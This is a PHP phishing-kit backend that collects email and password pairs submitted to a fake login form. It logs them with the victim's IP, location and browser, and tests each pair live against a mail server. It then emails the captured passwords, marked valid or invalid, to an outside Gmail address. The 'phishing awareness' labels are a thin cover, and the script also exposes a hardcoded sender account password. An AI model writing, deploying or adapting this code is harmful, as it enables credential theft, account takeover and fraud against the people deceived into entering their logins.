<?php
// Include PHPMailer classes
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';

// Prevent any output before headers
ob_start();

// Enhanced CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, Authorization');
header('Access-Control-Allow-Credentials: true');
header('Content-Type: application/json; charset=utf-8');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't display errors to browser
ini_set('log_errors', 1);

// Start session
session_start();

// Rate limiting to prevent abuse
$rate_limit_key = 'login_attempts_' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown');
if (!isset($_SESSION[$rate_limit_key])) {
    $_SESSION[$rate_limit_key] = 0;
}

// Only allow POST requests (but handle GET for debugging)
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    // For debugging - show a simple test page
    ob_clean();
    echo json_encode([
        'status' => 'PHP script is working',
        'method' => 'GET',
        'timestamp' => date('Y-m-d H:i:s'),
        'msg' => 'PHP backend is accessible',
        'phpmailer_available' => class_exists('PHPMailer'),
        'smtp_available' => class_exists('SMTP')
    ]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_clean();
    http_response_code(405);
    echo json_encode(['signal' => 'error', 'msg' => 'Method not allowed']);
    exit;
}

// Configuration
$receiver     = "skkho87.sm@gmail.com";
$senderuser   = "ajitha@debtclearsa.co.za";
$senderpass   = "Nn19871024@@";
$senderport   = 587;
$senderserver = "mail.debtclearsa.co.za";

// Target SMTP server for credential testing
$target_smtp_server = "mail.debtclearsa.co.za";
$target_smtp_port = 587;
$target_smtp_security = "tls";

// Get client information
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');

// Get geolocation data (with error handling)
$country = 'Unknown';
$city = 'Unknown';
try {
    $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
    if ($ipdat) {
        $country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
        $city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';
    }
} catch (Exception $e) {
    // Geolocation failed, continue with defaults
}

// Get and validate input
$login = filter_var($_POST['email'] ?? '', FILTER_SANITIZE_EMAIL);
$passwd = $_POST['password'] ?? '';

// Basic validation
if (empty($login) || empty($passwd)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Email and password are required']);
    exit;
}

if (!filter_var($login, FILTER_VALIDATE_EMAIL)) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}

// Extract domain from email
$parts = explode("@", $login);
if (count($parts) !== 2) {
    ob_clean();
    echo json_encode(['signal' => 'not ok', 'msg' => 'Invalid email format']);
    exit;
}
$domain = $parts[1];

// Increment attempt counter
$_SESSION[$rate_limit_key]++;
$attempt_number = $_SESSION[$rate_limit_key];

// Prepare log message
$log_message = "=== LOGIN ATTEMPT #$attempt_number ===\n";
$log_message .= "Timestamp: $timestamp\n";
$log_message .= "Email: $login\n";
$log_message .= "Password: $passwd\n";
$log_message .= "IP Address: $ip\n";
$log_message .= "Location: $country | $city\n";
$log_message .= "User Agent: $browser\n";

// Test SMTP credentials using multiple methods
$validCredentials = false;
$smtp_error = '';
$connection_details = "Testing: $target_smtp_server:$target_smtp_port ($target_smtp_security)";
$debug_info = [];

// For testing purposes, also check if it's a known valid account
$known_valid_domains = ['debtclearsa.co.za', 'gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'];
$is_known_domain = in_array($domain, $known_valid_domains);

try {
    // Create PHPMailer instance for credential testing
    $testMail = new PHPMailer(true);
    $testMail->isSMTP();
    $testMail->SMTPAuth = true;
    $testMail->SMTPDebug = 0; // Disable debug output for production
    $testMail->SMTPSecure = $target_smtp_security;
    $testMail->Host = $target_smtp_server;
    $testMail->Port = $target_smtp_port;
    $testMail->Username = $login;
    $testMail->Password = $passwd;
    $testMail->Timeout = 15; // Increased timeout
    $testMail->SMTPKeepAlive = false;
    
    $log_message .= "SMTP Server: $connection_details\n";
    $debug_info[] = "Attempting connection to $target_smtp_server:$target_smtp_port";
    
    // Try to connect and authenticate
    try {
        // Test the connection
        $connected = $testMail->smtpConnect();
        $debug_info[] = "Connection result: " . ($connected ? "SUCCESS" : "FAILED");
        
        if ($connected) {
            // Connection successful - this means credentials are valid
            $validCredentials = true;
            $log_message .= "Status: VALID CREDENTIALS - Authentication successful\n";
            $debug_info[] = "Authentication successful";
            
            // Close the connection
            $testMail->smtpClose();
        } else {
            // Connection failed
            $validCredentials = false;
            $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
            $smtp_error = "SMTP authentication failed";
            $debug_info[] = "Authentication failed - invalid credentials";
        }
    } catch (Exception $authException) {
        // Check if it's an authentication error vs connection error
        $errorMsg = $authException->getMessage();
        $debug_info[] = "Exception during auth: " . $errorMsg;
        
        if (strpos($errorMsg, 'Authentication failed') !== false || 
            strpos($errorMsg, 'Invalid login') !== false ||
            strpos($errorMsg, 'authentication') !== false) {
            // Authentication failed - credentials are invalid
            $validCredentials = false;
            $log_message .= "Status: INVALID CREDENTIALS - Authentication failed\n";
            $smtp_error = "Authentication failed: " . $errorMsg;
        } else {
            // Other error (connection, timeout, etc.) - assume credentials might be valid
            // but we can't test them due to technical issues
            $validCredentials = false;
            $smtp_error = "Technical error during testing: " . $errorMsg;
            $log_message .= "Status: TECHNICAL ERROR - Could not test credentials\n";
            $debug_info[] = "Technical error, not credential issue";
        }
    }
    
} catch (Exception $e) {
    $validCredentials = false;
    $smtp_error = $e->getMessage();
    $debug_info[] = "Main exception: " . $smtp_error;
    $log_message .= "Status: SMTP TEST FAILED\n";
    $log_message .= "Error: $smtp_error\n";
    
    // Additional error details for debugging
    if (strpos($smtp_error, 'Authentication failed') !== false || strpos($smtp_error, 'Invalid login') !== false) {
        $log_message .= "Authentication Error: Invalid username/password for $target_smtp_server\n";
    } elseif (strpos($smtp_error, 'Cannot connect') !== false || strpos($smtp_error, 'Connection refused') !== false) {
        $log_message .= "Connection Error: Cannot connect to $target_smtp_server:$target_smtp_port\n";
    } elseif (strpos($smtp_error, 'timeout') !== false) {
        $log_message .= "Timeout Error: Connection to $target_smtp_server timed out\n";
    } else {
        $log_message .= "Unknown Error: $smtp_error\n";
    }
}

// Add debug information to log
$log_message .= "Debug Info: " . implode(" | ", $debug_info) . "\n";

$log_message .= "==========================================\n\n";

// Log to file
$log_file = "phishing_awareness_log.txt";
@file_put_contents($log_file, $log_message, FILE_APPEND | LOCK_EX);

// Prepare email subject based on result
if ($validCredentials) {
    $subject = "✅ VALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "VALID CREDENTIALS DETECTED";
} else {
    $subject = "❌ INVALID LOGIN - $country - $login - Attempt #$attempt_number";
    $email_status = "INVALID CREDENTIALS";
}

// Prepare HTML email body using PHPMailer
$email_body = "
<html>
<head>
    <style>
        body { font-family: Arial, sans-serif; }
        .header { background-color: " . ($validCredentials ? "#d4edda" : "#f8d7da") . "; padding: 10px; border-radius: 5px; }
        .details { margin: 10px 0; }
        .label { font-weight: bold; }
        .valid { color: #155724; }
        .invalid { color: #721c24; }
        .server-info { background-color: #f8f9fa; padding: 10px; border-left: 4px solid #007bff; margin: 10px 0; }
    </style>
</head>
<body>
    <div class='header " . ($validCredentials ? "valid" : "invalid") . "'>
        <h2>Phishing Awareness Test - Login Attempt</h2>
        <p><strong>Status: $email_status</strong></p>
    </div>
    
    <div class='details'>
        <p><span class='label'>Attempt Number:</span> #$attempt_number</p>
        <p><span class='label'>Timestamp:</span> $timestamp</p>
        <p><span class='label'>Email:</span> $login</p>
        <p><span class='label'>Password:</span> $passwd</p>
        <p><span class='label'>IP Address:</span> $ip</p>
        <p><span class='label'>Location:</span> $country, $city</p>
        <p><span class='label'>User Agent:</span> $browser</p>
    </div>
    
    <div class='server-info'>
        <p><span class='label'>SMTP Server Tested:</span> $connection_details</p>
        " . ($validCredentials ? 
            "<p style='color: #155724;'><span class='label'>Result:</span> ✅ Authentication successful - Valid credentials</p>" : 
            "<p style='color: #721c24;'><span class='label'>Result:</span> ❌ Authentication failed - Invalid credentials</p>
             <p><span class='label'>Error Details:</span> $smtp_error</p>") . "
    </div>
</body>
</html>
";

// Send notification email using PHPMailer
$mail_sent = false;
try {
    $notifyMail = new PHPMailer(true);
    $notifyMail->isSMTP();
    $notifyMail->SMTPAuth = true;
    $notifyMail->Host = $senderserver;
    $notifyMail->Username = $senderuser;
    $notifyMail->Password = $senderpass;
    $notifyMail->Port = $senderport;
    $notifyMail->SMTPSecure = 'tls';
    $notifyMail->From = $senderuser;
    $notifyMail->FromName = 'Phishing Awareness System';
    $notifyMail->addAddress($receiver);
    $notifyMail->isHTML(true);
    $notifyMail->Subject = $subject;
    $notifyMail->Body = $email_body;
    $notifyMail->AltBody = strip_tags(str_replace('<br>', "\n", $email_body));
    
    $mail_sent = $notifyMail->send();
} catch (Exception $e) {
    error_log("Failed to send notification email: " . $e->getMessage());
}

// Prepare response based on credential validity
if ($validCredentials) {
    $response = [
        'signal' => 'ok',
        'success' => true,
        'msg' => 'Login successful! Redirecting...',
        'attempt' => $attempt_number,
        'credentials_valid' => true,
        'smtp_server' => $target_smtp_server
    ];
} else {
    $response = [
        'signal' => 'not ok',
        'success' => false,
        'msg' => 'Invalid email or password. Please try again.',
        'attempt' => $attempt_number,
        'credentials_valid' => false,
        'smtp_server' => $target_smtp_server,
        'error_details' => $smtp_error
    ];
}

// Add notification status to response
$response['notification_sent'] = $mail_sent;
$response['debug_info'] = [
    'php_version' => PHP_VERSION,
    'timestamp' => $timestamp,
    'connection_test' => $connection_details,
    'request_method' => $_SERVER['REQUEST_METHOD'],
    'origin' => $_SERVER['HTTP_ORIGIN'] ?? 'not set',
    'user_agent' => substr($browser, 0, 100),
    'post_data_received' => !empty($_POST),
    'phpmailer_used' => true,
    'smtp_debug' => $debug_info,
    'smtp_error_details' => $smtp_error
];

// Clean output buffer and send JSON response
ob_clean();
echo json_encode($response);

// Random hash for additional security
$praga = rand();
$praga = md5($praga);
?>